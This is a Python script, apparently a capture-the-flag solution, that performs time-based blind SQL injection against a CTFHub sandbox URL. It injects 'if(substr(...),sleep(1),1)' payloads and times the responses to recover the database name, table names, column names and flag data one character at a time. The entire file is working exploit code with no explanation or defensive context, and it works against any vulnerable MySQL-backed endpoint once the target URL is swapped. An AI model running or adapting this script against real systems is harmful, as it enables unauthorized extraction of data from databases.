# -*- coding: utf-8 -*-

import requests
import string
import time

def get_database(url):
    database = ''
    for i in range(1, 9):
        for j in "sqcwertyuioplkjhgfdazxvbnm":#string.ascii_letters:
            target = url + 'if(substr(database(),%d,1)="%s",sleep(1),1)' % (i, j)
            time1 = time.time()
            request = requests.get(target)
            time2 = time.time()
            if time2 - time1 > 1:
                database += j
                print(database)
                break
    print('Database:', database)

def get_table(url, database):
    tablesname = []
    for i in range(0, 2):
        name = ''
        for j in range(1, 6):
            for k in "sqcwertyuioplkjhgfdazxvbnm":#string.ascii_letters:
                target = url + 'if(substr((select table_name from information_schema.tables where table_schema="' +\
                         database + '" limit %d,1),%d,1)="%s",sleep(1),1)' % (i, j, k)
                time1 = time.time()
                request = requests.get(target)
                time2 = time.time()
                if time2 - time1 > 1:
                    name += k
                    print(name)
                    break
        tablesname.append(name)
    print('Tablesname:', tablesname)

def get_columns(url, database, tablename):
    columns = []
    for i in range(0, 3):
        name = ''
        for j in range(1, 6):
            for k in "sqcwertyuioplkjhgfdazxvbnm":#string.ascii_letters:
                target = url + 'if(substr((select column_name from information_schema.columns where table_name="'\
                         + tablename + '" and table_schema="' + database\
                         + '" limit %d,1),%d,1)="%s",sleep(1),1)' % (i, j, k)
                time1 = time.time()
                request = requests.get(target)
                time2 = time.time()
                if time2 - time1 > 1:
                    name += k
                    print(name)
                    break
        columns.append(name)
    print('Columnsname:', columns)

def get_data(url, database, tablename, columns):
    data = ''
    for i in range(0, 50):
        for j in string.digits\
                 + string.ascii_letters\
                 + string.punctuation:
            target = url + 'if(substr((select '\
                      +columns\
                      + ' from ' + tablename\
                      + '),%d,1)="%s",sleep(1),1)' % (i, j)
            time1 = time.time()
            request = requests.get(target)
            time2 = time.time()
            if time2 - time1 > 1:
                data += j
                print(data)
                break
    print(data)

if __name__ == "__main__":
    url = "http://challenge-86c16fbb77670132.sandbox.ctfhub.com:10800/?id="
    #get_database(url)
    #get_table(url, 'sqli') #databse
    #get_columns(url, 'sqli', 'flag') #database tablename
    #get_data(url, 'sqli', 'flag', 'flag') #database tablename columns
